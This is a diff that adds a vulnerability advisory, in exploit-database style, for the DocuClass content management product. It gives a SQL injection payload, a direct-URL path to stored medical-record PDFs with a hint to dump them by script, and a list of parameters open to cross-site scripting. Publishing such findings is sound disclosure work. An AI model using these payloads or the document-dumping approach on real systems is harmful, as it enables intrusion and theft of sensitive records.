@@ -1,0 +1,62 @@
+# Exploit Title: [CIMA DocuClass Enterprise Content Management - Multiple Vulnerabilities]
+# Date: [July 15, 2016]
+# Exploit Author: [Karn Ganeshen (ipositivesecurity.blogspot.com)]
+# Vendor Homepage: [cima-software.com]
+# Version: [app version] (All)
+# Tested on: [Microsoft Windows 2008 R2]
+
+DocuClass is a modular and scalable enterprise content management (ECM) solution that allows organizations to streamline internal operations by significantly improving the way they manage their information within a business process. 
+
+Vulnerability Details
+
+1. SQL Injection [Post Auth]
+
+PoC
+
+Vulnerable URLs & parameters:
+
+A: POST request
+/dcrpcserver.php [parameter - uid]
+---
+Parameter: uid (POST)
+    Type: boolean-based blind
+    Title: PostgreSQL boolean-based blind - Parameter replace
+    Payload: cmd=searchform&action=getsavedqueries&node=&uid=(SELECT (CASE WHEN (7877=7877) THEN 7877 ELSE 1/(SELECT 0) END))
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: ASP.NET, Microsoft IIS 7.5, PHP 5.2.5
+back-end DBMS: Microsoft SQL Server 2008
+
+Impact
+An unauthenticated attacker can read or modify data in the application database, execute code, and compromise the host system.
+
+B: GET request
+/e-forms/dcformsserver.exe?action=createimagepdf&documentid=1408648&userid=755 [parameter - userid]
+
+
+2. Access Control Flaws
+DocuClass web application does not enforce strict access control.
+
+PoC:
+http://IP/medical_records/0000001337/0000000000123456.pdf
+
+Dump all the documents with a bit of scripting.
+
+Impact
+An unauthenticated user can access stored documents by directly calling the document url.
+
+3. Cross-Site Scripting
+
+DocuClass web application lacks strong input validation, and multiple urls & parameters are vulnerable to cross-site scripting (CWE-79) attacks.
+
+/e-forms/dcformsserver.exe [action parameter]
+/e-forms/dcformsserver.exe [documentid parameter]
+/e-forms/dcformsserver.exe [userid parameter]
+/reports_server.php [cmd parameter]
+/reports_server.php [reportid parameter]
+/reports_server.php [uid parameter]
+
+Impact
+An attacker may be able to execute arbitrary scripts/code in the context of the user's browser.
+
++++++
